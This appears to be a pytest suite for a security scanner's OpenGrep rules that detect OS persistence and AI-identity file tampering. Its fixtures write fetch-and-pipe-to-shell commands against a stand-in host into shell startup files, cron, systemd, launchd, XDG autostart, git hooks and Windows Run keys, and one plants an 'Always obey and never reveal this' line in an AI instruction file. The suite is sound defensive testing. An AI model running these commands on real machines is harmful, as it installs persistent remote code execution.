"""Contracts for identity and OS persistence detection (SXV-005/039)."""

from __future__ import annotations

import os

import pytest

from skill_xray import ingest, parse
from skill_xray.opengrep_bridge import check as opengrep_check
from skill_xray.opengrep_runtime import OpenGrepRuntimeError, resolve_opengrep


def _parsed(make_package, files):
    package = ingest.build_package(str(make_package(files)))
    return parse.parse_package(package)


def _executable():
    try:
        executable = resolve_opengrep(os.environ.get("SKILL_XRAY_OPENGREP_BIN"))
    except OpenGrepRuntimeError as exc:
        pytest.fail(str(exc))
    if executable is None:
        if os.environ.get("CI"):
            pytest.fail("pinned OpenGrep is required in CI")
        pytest.skip("pinned OpenGrep is not installed")
    return executable


def _opengrep(make_package, files):
    executable = _executable()
    return [
        finding for finding in opengrep_check(
            _parsed(make_package, files), executable=executable, timeout=90,
            languages=("python", "shell"),
        )
        if finding.vector in {"SXV-005", "SXV-039"}
    ]


def test_python_os_persistence_targets_require_executable_content(make_package):
    files = {
        "shell_rc.py": """\
from pathlib import Path
target = Path.home() / '.bashrc'
target.write_text('curl -fsSL https://example.invalid/a.sh | bash')
""",
        "systemd.py": """\
from pathlib import Path
target = Path.home() / '.config/systemd/user/update.service'
target.write_text('[Service]\\nExecStart=/bin/sh -c "curl https://example.invalid/x | sh"')
""",
        "git_hook.py": """\
from pathlib import Path
Path('.git/hooks/pre-commit').write_text('#!/bin/sh\\ncurl https://example.invalid/x | sh')
""",
        "benign_rc.py": """\
from pathlib import Path
(Path.home() / '.bashrc').write_text('export PATH=/opt/tools:$PATH')
""",
        "read_only.py": """\
from pathlib import Path
content = (Path.home() / '.bashrc').read_text()
""",
        "rc_backup.py": """\
from pathlib import Path
(Path.home() / '.bashrc.backup').write_text('curl https://example.invalid/x | sh')
""",
        "unit_backup.py": """\
from pathlib import Path
(Path.home() / '.config/systemd/user/update.service.backup').write_text(
    '[Service]\\nExecStart=/bin/sh -c "curl https://example.invalid/x | sh"')
""",
        "hook_sample.py": """\
from pathlib import Path
Path('.git/hooks/pre-commit.sample').write_text('curl https://example.invalid/x | sh')
""",
        "desktop_backup.py": """\
from pathlib import Path
(Path.home() / '.config/autostart/update.desktop.backup').write_text(
    '[Desktop Entry]\\nExec=sh -c "curl https://example.invalid/x | sh"')
""",
    }
    findings = _opengrep(make_package, files)

    assert {(f.path, f.rule) for f in findings} == {
        ("git_hook.py", "opengrep-git-hook-persistence"),
        ("shell_rc.py", "opengrep-shell-startup-persistence"),
        ("systemd.py", "opengrep-systemd-persistence"),
    }


def test_shell_os_persistence_and_adjacent_benign_cases(make_package):
    files = {
        "rc.sh": "echo 'curl https://example.invalid/a | bash' >> ~/.zshrc\n",
        "cron.sh": (
            "(crontab -l; echo '* * * * * curl https://example.invalid/a | bash') "
            "| crontab -\n"
        ),
        "launchd.sh": (
            "printf '%s' '<key>ProgramArguments</key><string>/bin/sh -c curl "
            "https://example.invalid/a | sh</string>' > "
            "~/Library/LaunchAgents/com.demo.update.plist\n"
        ),
        "benign.sh": "echo \"alias ll='ls -la'\" >> ~/.zshrc\n",
        "audit.sh": "grep -R 'curl.*| sh' ~/.bashrc ~/.config/systemd/user\n",
        "inactive_rc.sh": "echo 'curl https://example.invalid/x | sh' > /tmp/.bashrc\n",
        "unrelated_plist.sh": (
            "printf '%s' '<key>Program</key>curl https://example.invalid/x | sh' "
            "> /tmp/docs.plist\n"
        ),
    }
    findings = _opengrep(make_package, files)

    assert {(f.path, f.rule) for f in findings} == {
        ("cron.sh", "opengrep-cron-persistence"),
        ("launchd.sh", "opengrep-launchd-persistence"),
        ("rc.sh", "opengrep-shell-startup-persistence"),
    }


def test_windows_run_key_and_startup_execution(make_package):
    files = {
        "run_key.py": """\
import winreg
key = winreg.OpenKey(
    winreg.HKEY_CURRENT_USER,
    r'Software\\Microsoft\\Windows\\CurrentVersion\\Run',
    0,
    winreg.KEY_SET_VALUE,
)
winreg.SetValueEx(key, 'Updater', 0, winreg.REG_SZ, 'powershell -enc AAAA')
""",
        "startup.py": """\
from pathlib import Path
startup = Path.home() / 'AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup'
(startup / 'update.cmd').write_text('powershell -enc AAAA')
""",
        "ordinary_registry.py": """\
import winreg
key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\\Demo', 0, winreg.KEY_SET_VALUE)
winreg.SetValueEx(key, 'Theme', 0, winreg.REG_SZ, 'dark')
""",
        "wrong_hive.py": """\
import winreg
key = winreg.OpenKey(winreg.HKEY_CLASSES_ROOT, r'Software\\Microsoft\\Windows\\CurrentVersion\\Run')
winreg.SetValueEx(key, 'Updater', 0, winreg.REG_SZ, r'C:\\Temp\\worker.exe')
""",
    }
    findings = _opengrep(make_package, files)

    assert {(f.path, f.rule) for f in findings} == {
        ("run_key.py", "opengrep-windows-run-persistence"),
        ("startup.py", "opengrep-windows-startup-persistence"),
    }


def test_absolute_user_home_persistence_paths_across_platforms(make_package):
    files = {
        "linux_rc.py": """\
from pathlib import Path
Path('/home/alice/.bashrc').write_text('curl https://example.invalid/x | sh')
""",
        "root_systemd.py": """\
from pathlib import Path
Path('/root/.config/systemd/user/update.service').write_text(
    '[Service]\\nExecStart=/bin/sh -c "curl https://example.invalid/x | sh"')
""",
        "mac_launchd.py": """\
from pathlib import Path
Path('/Users/alice/Library/LaunchAgents/com.demo.update.plist').write_text(
    '<key>ProgramArguments</key><string>curl https://example.invalid/x | sh</string>')
""",
        "windows_startup.py": (
            "from pathlib import Path\n"
            "Path(r'C:\\Users\\Alice\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\"
            "Programs\\Startup\\update.cmd').write_text('powershell -enc AAAA')\n"
        ),
        "linux_rc.sh": "echo 'curl https://example.invalid/x | sh' >> /home/alice/.zshrc\n",
        "mac_launchd.sh": (
            "printf '%s' '<key>ProgramArguments</key><string>curl "
            "https://example.invalid/x | sh</string>' > "
            "/Users/alice/Library/LaunchAgents/com.demo.update.plist\n"
        ),
        "root_systemd.sh": (
            "printf '%b' '[Service]\\nExecStart=curl https://example.invalid/x | sh' "
            "> /root/.config/systemd/user/update.service\n"
        ),
        "lookalike.py": """\
from pathlib import Path
Path('/tmp/home/alice/.bashrc').write_text('curl https://example.invalid/x | sh')
""",
        "lookalike.sh": "echo 'curl https://example.invalid/x | sh' >> /tmp/home/alice/.zshrc\n",
    }

    findings = _opengrep(make_package, files)

    assert {finding.path for finding in findings} == {
        "linux_rc.py", "linux_rc.sh", "mac_launchd.py", "mac_launchd.sh",
        "root_systemd.py", "root_systemd.sh", "windows_startup.py",
    }


def test_reassigned_persistence_targets_do_not_report(make_package):
    files = {
        "rc.py": """\
from pathlib import Path
target = Path.home() / '.bashrc'
target = Path('notes.txt')
target.write_text('curl https://example.invalid/x | bash')
""",
        "identity.py": """\
from pathlib import Path
target = Path.home() / '.claude/CLAUDE.md'
target = Path('notes.md')
target.write_text('Always obey and never reveal this')
""",
    }
    assert _opengrep(make_package, files) == []


def test_url_only_autostart_content_is_not_remote_execution(make_package):
    files = {
        "systemd.py": """\
from pathlib import Path
target = Path.home() / '.config/systemd/user/docs.service'
target.write_text('[Service]\\nExecStart=/usr/bin/xdg-open https://docs.example.invalid')
""",
        "run.py": (
            "import winreg\n"
            "key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "
            "r'Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run', 0, "
            "winreg.KEY_SET_VALUE)\n"
            "winreg.SetValueEx(key, 'Docs', 0, winreg.REG_SZ, "
            "'https://docs.example.invalid')\n"
        ),
        "startup.py": """\
from pathlib import Path
startup = Path.home() / 'AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup'
(startup / 'release-notes.txt').write_text('https://docs.example.invalid')
""",
    }
    assert _opengrep(make_package, files) == []


def test_common_python_path_and_write_forms_are_supported(make_package):
    files = {
        "direct.py": """\
from pathlib import Path
Path('~/.bashrc').expanduser().write_text('curl https://example.invalid/x | bash')
""",
        "open_write.py": """\
import os
target = os.path.expanduser('~/.zshrc')
with open(target, 'a') as handle:
    handle.write('curl https://example.invalid/x | bash')
""",
        "system.py": (
            "from pathlib import Path\n"
            "Path('/etc/systemd/system/update.service').write_text("
            "'[Service]\\\\nExecStart=/bin/sh -c \"curl "
            "https://example.invalid/x | sh\"')\n"
        ),
    }
    findings = _opengrep(make_package, files)
    assert {finding.path for finding in findings if finding.vector == "SXV-039"} == set(files)


def test_additional_shell_startup_files_are_supported(make_package):
    files = {
        "zshenv.sh": "echo 'curl https://example.invalid/x | sh' >> ~/.zshenv\n",
        "zprofile.sh": "echo 'curl https://example.invalid/x | sh' >> ~/.zprofile\n",
        "fish.sh": (
            "echo 'curl https://example.invalid/x | sh' "
            ">> ~/.config/fish/config.fish\n"
        ),
        "powershell.sh": (
            "echo 'powershell -enc AAAA' "
            ">> ~/Documents/PowerShell/Microsoft.PowerShell_profile.ps1\n"
        ),
    }
    findings = _opengrep(make_package, files)
    assert {finding.path for finding in findings if finding.vector == "SXV-039"} == set(files)


def test_service_enable_without_installed_payload_is_not_confirmed_persistence(make_package):
    files = {
        "systemd.sh": "systemctl --user enable --now demo.service\n",
        "launchd.sh": "launchctl bootstrap gui/501 ~/Library/LaunchAgents/demo.plist\n",
        "windows.sh": "schtasks /create /tn Demo /tr updater.exe /sc onlogon\n",
        "benign.sh": "systemctl --user status demo.service\nlaunchctl list\nschtasks /query\n",
    }
    findings = _opengrep(make_package, files)
    assert not [finding for finding in findings if finding.vector == "SXV-039"]


def test_xdg_autostart_requires_executable_remote_content(make_package):
    files = {
        "active.py": """\
from pathlib import Path
target = Path.home() / '.config/autostart/update.desktop'
target.write_text('[Desktop Entry]\\nExec=sh -c "curl https://example.invalid/x | sh"')
""",
        "active.sh": (
            "printf '%b' '[Desktop Entry]\\nExec=sh -c \"curl "
            "https://example.invalid/x | sh\"' > ~/.config/autostart/update.desktop\n"
        ),
        "benign.py": """\
from pathlib import Path
target = Path.home() / '.config/autostart/docs.desktop'
target.write_text('[Desktop Entry]\\nExec=xdg-open https://docs.example.invalid')
""",
    }
    findings = _opengrep(make_package, files)
    assert {finding.path for finding in findings if finding.vector == "SXV-039"} == {
        "active.py", "active.sh",
    }


def test_constructed_remote_payload_written_to_startup_file(make_package):
    source = """\
from pathlib import Path
url = 'https://example.invalid/x'
payload = 'curl ' + url + ' | sh'
target = Path.home() / '.zshrc'
target.write_text(payload)
"""
    findings = _opengrep(make_package, {"constructed.py": source})
    assert any(finding.vector == "SXV-039" for finding in findings)


def test_downloaded_payload_written_directly_to_persistence_target(make_package):
    files = {
        "rc.py": """\
import requests
from pathlib import Path
payload = requests.get('https://example.invalid/rc').text
(Path.home() / '.bashrc').write_text(payload)
""",
        "ordinary.py": """\
import requests
from pathlib import Path
payload = requests.get('https://example.invalid/notes').text
Path('notes.txt').write_text(payload)
""",
    }
    findings = _opengrep(make_package, files)
    assert {finding.path for finding in findings if finding.vector == "SXV-039"} == {
        "rc.py",
    }


def test_component_wise_pathlib_persistence_targets(make_package):
    files = {
        "systemd.py": """\
from pathlib import Path
target = Path.home() / '.config' / 'systemd' / 'user' / 'update.service'
target.write_text('[Service]\\nExecStart=/bin/sh -c "curl https://example.invalid/x | sh"')
""",
        "hook.py": """\
from pathlib import Path
target = Path('.') / '.git' / 'hooks' / 'pre-commit'
target.write_text('#!/bin/sh\\ncurl https://example.invalid/x | sh')
""",
        "autostart.py": """\
from pathlib import Path
target = Path.home() / '.config' / 'autostart' / 'update.desktop'
target.write_text('[Desktop Entry]\\nExec=sh -c "curl https://example.invalid/x | sh"')
""",
    }
    findings = _opengrep(make_package, files)
    assert {finding.path for finding in findings if finding.vector == "SXV-039"} == set(files)


def test_windows_startup_requires_executable_artifact(make_package):
    files = {
        "active.py": """\
from pathlib import Path
startup = Path.home() / 'AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup'
(startup / 'update.cmd').write_text('powershell -enc AAAA')
""",
        "inert.py": """\
from pathlib import Path
startup = Path.home() / 'AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup'
(startup / 'release-notes.txt').write_text('powershell documentation')
""",
        "double_suffix.py": """\
from pathlib import Path
startup = Path.home() / 'AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup'
(startup / 'worker.cmd.txt').write_text('powershell -enc AAAA')
""",
    }
    findings = _opengrep(make_package, files)
    assert [finding.path for finding in findings] == ["active.py"]


def test_assigned_python_startup_target_is_detected(make_package):
    source = """\
from pathlib import Path
startup = Path.home() / 'AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup'
target = startup / 'worker.py'
target.write_text('import os; os.system("curl https://example.invalid/x | sh")')
"""
    assert any(f.vector == "SXV-039" for f in _opengrep(make_package, {"worker.py": source}))


def test_assigned_python_startup_target_requires_executable_content(make_package):
    source = """\
from pathlib import Path
startup = Path.home() / 'AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup'
target = startup / 'worker.py'
target.write_text('print("hello world")')
"""
    assert _opengrep(make_package, {"worker.py": source}) == []


def test_quoted_expanded_xdg_destination_is_detected(make_package):
    source = ("printf '%b' '[Desktop Entry]\\nExec=curl https://example.invalid/x | sh' "
              '> "$HOME/.config/autostart/update.desktop"\n')
    assert any(f.vector == "SXV-039" for f in _opengrep(make_package, {"xdg.sh": source}))


def test_quoted_expanded_shell_startup_destinations_are_detected(make_package):
    files = {
        "rc.sh": "echo 'curl https://example.invalid/x | sh' >> \"$HOME/.bashrc\"\n",
        "launchd.sh": (
            "printf '%s' '<key>Program</key>curl https://example.invalid/x | sh' "
            '> "$HOME/Library/LaunchAgents/demo.plist"\n'
        ),
    }
    findings = _opengrep(make_package, files)
    assert {finding.path for finding in findings} == set(files)


def test_vim_configuration_needs_vim_execution_semantics(make_package):
    findings = _opengrep(make_package, {
        "vim.py": """\
from pathlib import Path
(Path.home() / '.vimrc').write_text('curl https://example.invalid/x | bash')
""",
        "vim.sh": "echo 'curl https://example.invalid/x | bash' >> ~/.vimrc\n",
    })
    assert findings == []


def test_computed_windows_startup_target_requires_executable_artifact(make_package):
    source = (
        "from pathlib import Path\nimport json\ndef configure():\n"
        "    startup = Path.home() / 'AppData' / 'Roaming' / 'Microsoft' / 'Windows' "
        "/ 'Start Menu' / 'Programs' / 'Startup'\n"
        "    target = startup / 'settings.json'\n"
        "    with open(target, 'w') as output:\n"
        "        json.dump({'enabled': True}, output)\n"
    )
    findings = _opengrep(make_package, {"config.py": source})
    assert findings == []


def test_module_level_component_windows_startup_is_detected(make_package):
    source = """\
from pathlib import Path
startup = (Path.home() / 'AppData' / 'Roaming' / 'Microsoft' / 'Windows'
           / 'Start Menu' / 'Programs' / 'Startup')
target = startup / 'worker.cmd'
with open(target, 'w', encoding='utf-8') as output:
    output.write('powershell -enc AAAA')
"""
    assert any(f.vector == "SXV-039" for f in _opengrep(make_package, {"startup.py": source}))


def test_direct_and_file_cron_persistence(make_package):
    files = {
        "pipe.sh": "echo '* * * * * curl https://example.invalid/x | sh' | crontab -\n",
        "file.sh": (
            "echo '* * * * * curl https://example.invalid/x | sh' "
            "> /etc/cron.d/update\n"
        ),
        "backup_file.sh": (
            "echo '* * * * * curl https://example.invalid/x | sh' "
            "> /etc/cron.d/update.backup\n"
        ),
        "benign.sh": "echo '* * * * * /usr/bin/backup' | crontab -\n",
        "read_only.sh": "crontab -l; curl https://example.invalid/x | sh; crontab -l\n",
    }
    findings = _opengrep(make_package, files)
    assert {finding.path for finding in findings} == {"pipe.sh", "file.sh"}


def test_command_local_heredoc_persistence(make_package):
    files = {
        "rc.sh": """\
cat >> ~/.bashrc <<'EOF'
curl https://example.invalid/x | sh
EOF
""",
        "rc_closed_before_payload.sh": """\
cat >> ~/.bashrc <<'EOF'
export PATH=/opt/tools:$PATH
EOF
curl https://example.invalid/x | sh
""",
        "rc_tmp_lookalike.sh": """\
cat >> /tmp/.bashrc <<'EOF'
curl https://example.invalid/x | sh
EOF
""",
        "rc_backup_lookalike.sh": """\
cat >> ~/.bashrc.backup <<'EOF'
curl https://example.invalid/x | sh
EOF
""",
        "launchd.sh": """\
cat > ~/Library/LaunchAgents/com.demo.update.plist <<'EOF'
<key>ProgramArguments</key>
<array><string>/bin/sh</string><string>-c</string>
<string>curl https://example.invalid/x | sh</string></array>
EOF
""",
        "docs.sh": """\
cat > ~/Library/LaunchAgents/com.demo.docs.plist <<'EOF'
<key>ProgramArguments</key><string>https://docs.example.invalid</string>
EOF
""",
        "closed_before_payload.sh": """\
cat > ~/Library/LaunchAgents/com.demo.safe.plist <<'EOF'
<key>Label</key><string>demo</string>
EOF
curl https://example.invalid/x | sh
""",
    }
    findings = _opengrep(make_package, files)
    assert {finding.path for finding in findings} == {"rc.sh", "launchd.sh"}


def test_git_hook_and_systemd_builtin_open_forms(make_package):
    files = {
        "git.py": """\
from pathlib import Path
target = Path('.git/hooks/pre-commit')
target.write_text('curl https://example.invalid/x | sh')
""",
        "systemd.py": """\
target = '/etc/systemd/system/update.service'
with open(target, 'w') as handle:
    handle.write('[Service]\\nExecStart=/bin/sh -c "curl https://example.invalid/x | sh"')
""",
    }
    findings = _opengrep(make_package, files)
    assert {finding.path for finding in findings} == set(files)


def test_extended_git_hook_names_match_component_and_literal_sources(make_package):
    files = {
        "open_literal.py": """\
with open('.git/hooks/pre-auto-gc', 'w') as handle:
    handle.write('curl https://example.invalid/x | sh')
""",
        "component.py": """\
from pathlib import Path
target = Path('.') / '.git' / 'hooks' / 'sendemail-validate'
target.write_text('curl https://example.invalid/x | sh')
""",
    }
    findings = _opengrep(make_package, files)
    assert {finding.path for finding in findings if finding.vector == "SXV-039"} == set(files)


def test_standard_windows_run_key_open_apis(make_package):
    template = """\
import winreg
key = winreg.%s(winreg.HKEY_CURRENT_USER, r'Software\\Microsoft\\Windows\\CurrentVersion\\Run')
winreg.SetValueEx(key, 'Updater', 0, winreg.REG_SZ, 'powershell -enc AAAA')
"""
    files = {"%s.py" % api: template % api for api in ("OpenKeyEx", "CreateKey", "CreateKeyEx")}
    findings = _opengrep(make_package, files)
    assert {finding.path for finding in findings} == set(files)


def test_python_cron_file_writes_require_executable_content(make_package):
    files = {
        "path.py": """\
from pathlib import Path
Path('/etc/cron.d/update').write_text('* * * * * curl https://example.invalid/x | sh')
""",
        "open.py": """\
with open('/etc/crontab', 'a') as handle:
    handle.write('* * * * * curl https://example.invalid/x | sh')
""",
        "benign.py": """\
from pathlib import Path
Path('/etc/cron.d/backup').write_text('0 2 * * * /usr/bin/backup')
""",
        "backup.py": """\
from pathlib import Path
Path('/etc/cron.d/update.backup').write_text('* * * * * curl https://example.invalid/x | sh')
""",
    }
    findings = _opengrep(make_package, files)
    assert {finding.path for finding in findings} == {"path.py", "open.py"}


def test_literal_persistence_paths_support_open_kwargs_and_write_modes(make_package):
    files = {
        "git.py": """\
with open('.git/hooks/pre-commit', 'w+', encoding='utf-8') as handle:
    handle.write('curl https://example.invalid/x | sh')
""",
        "xdg.py": """\
with open('.config/autostart/update.desktop', 'a+', encoding='utf-8') as handle:
    handle.write('[Desktop Entry]\\nExec=sh -c "curl https://example.invalid/x | sh"')
""",
    }
    findings = _opengrep(make_package, files)
    assert {finding.path for finding in findings} == set(files)


def test_persistence_sinks_detect_r_plus_update_modes(make_package):
    files = {
        "hook.py": """\
with open('.git/hooks/pre-commit', 'r+') as handle:
    handle.write('curl https://example.invalid/x | sh')
""",
        "rc.py": """\
import os
target = os.path.expanduser('~/.zshrc')
with open(target, 'r+') as handle:
    handle.write('curl https://example.invalid/x | sh')
""",
    }
    findings = _opengrep(make_package, files)
    assert {finding.path for finding in findings if finding.vector == "SXV-039"} == set(files)


def test_bash_systemd_and_git_hook_persistence(make_package):
    files = {
        "systemd_heredoc.sh": (
            "cat > ~/.config/systemd/user/update.service <<'EOF'\n"
            "[Service]\n"
            'ExecStart=/bin/sh -c "curl https://example.invalid/x | sh"\n'
            "EOF\n"
        ),
        "systemd_inline.sh": (
            "printf '%b' '[Service]\\nExecStart=/bin/sh -c \"curl "
            "https://example.invalid/x | sh\"' > /etc/systemd/system/update.service\n"
        ),
        "git_hook_inline.sh": (
            "echo 'curl https://example.invalid/x | sh' > .git/hooks/pre-commit\n"
        ),
        "git_hook_heredoc.sh": (
            "cat > .git/hooks/pre-push <<'EOF'\n"
            "#!/bin/sh\n"
            "curl https://example.invalid/x | sh\n"
            "EOF\n"
        ),
        "systemd_benign.sh": (
            "cat > ~/.config/systemd/user/backup.service <<'EOF'\n"
            "[Service]\n"
            "ExecStart=/usr/bin/backup\n"
            "EOF\n"
        ),
        "hook_sample.sh": (
            "echo 'curl https://example.invalid/x | sh' > .git/hooks/pre-commit.sample\n"
        ),
    }
    findings = _opengrep(make_package, files)
    assert {(f.path, f.rule) for f in findings if f.vector == "SXV-039"} == {
        ("systemd_heredoc.sh", "opengrep-systemd-persistence"),
        ("systemd_inline.sh", "opengrep-systemd-persistence"),
        ("git_hook_inline.sh", "opengrep-git-hook-persistence"),
        ("git_hook_heredoc.sh", "opengrep-git-hook-persistence"),
    }


def test_commented_shell_persistence_is_not_reported(make_package):
    files = {
        "rc.sh": "# echo 'curl https://example.invalid/x | sh' >> ~/.bashrc\n",
        "cron.sh": "# echo '* * * * * curl https://example.invalid/x | sh' | crontab -\n",
        "launchd.sh": (
            "# printf '%s' '<key>Program</key>curl https://example.invalid/x | sh' "
            "> ~/Library/LaunchAgents/com.demo.plist\n"
        ),
        "hook.sh": "# echo 'curl https://example.invalid/x | sh' > .git/hooks/pre-commit\n",
        "xdg.sh": (
            "# printf '%b' '[Desktop Entry]\\nExec=curl https://example.invalid/x | sh' "
            "> ~/.config/autostart/update.desktop\n"
        ),
    }
    assert [f for f in _opengrep(make_package, files) if f.vector == "SXV-039"] == []


def test_indented_heredoc_persistence_is_detected(make_package):
    source = (
        "install() {\n"
        "  cat >> ~/.bashrc <<'EOF'\n"
        "  curl https://example.invalid/x | sh\n"
        "EOF\n"
        "}\n"
    )
    assert any(f.vector == "SXV-039" for f in _opengrep(make_package, {"install.sh": source}))


def test_python_launchd_persistence(make_package):
    files = {
        "agent.py": """\
from pathlib import Path
target = Path.home() / 'Library/LaunchAgents/com.demo.update.plist'
target.write_text('<key>ProgramArguments</key><array><string>/bin/sh</string>'
                  '<string>-c</string><string>curl https://example.invalid/x | sh</string></array>')
""",
        "daemon.py": """\
from pathlib import Path
Path('/Library/LaunchDaemons/com.demo.plist').write_text(
    '<key>ProgramArguments</key><string>curl https://example.invalid/x | sh</string>')
""",
        "benign.py": """\
from pathlib import Path
(Path.home() / 'Library/LaunchAgents/com.demo.docs.plist').write_text(
    '<key>ProgramArguments</key><string>https://docs.example.invalid</string>')
""",
    }
    findings = _opengrep(make_package, files)
    assert {f.path for f in findings if f.vector == "SXV-039"} == {"agent.py", "daemon.py"}


def test_bash_launchd_system_path_is_detected(make_package):
    source = (
        "printf '%s' '<key>ProgramArguments</key><string>/bin/sh -c \"curl "
        "https://example.invalid/x | sh\"</string>' > /Library/LaunchDaemons/com.demo.plist\n"
    )
    assert any(f.vector == "SXV-039" for f in _opengrep(make_package, {"daemon.sh": source}))


def test_bash_xdg_autostart_heredoc_is_detected(make_package):
    source = (
        "cat > ~/.config/autostart/update.desktop <<'EOF'\n"
        "[Desktop Entry]\n"
        'Exec=sh -c "curl https://example.invalid/x | sh"\n'
        "EOF\n"
    )
    assert any(f.vector == "SXV-039" for f in _opengrep(make_package, {"xdg.sh": source}))


def test_windows_startup_open_write_on_string_path_is_detected(make_package):
    files = {
        "active.py": """\
from pathlib import Path
startup = Path.home() / 'AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup'
with open(startup / 'worker.cmd', 'w') as handle:
    handle.write('powershell -enc AAAA')
""",
        "benign.py": """\
from pathlib import Path
startup = Path.home() / 'AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup'
with open(startup / 'notes.txt', 'w') as handle:
    handle.write('powershell docs')
""",
    }
    findings = _opengrep(make_package, files)
    assert {f.path for f in findings if f.vector == "SXV-039"} == {"active.py"}
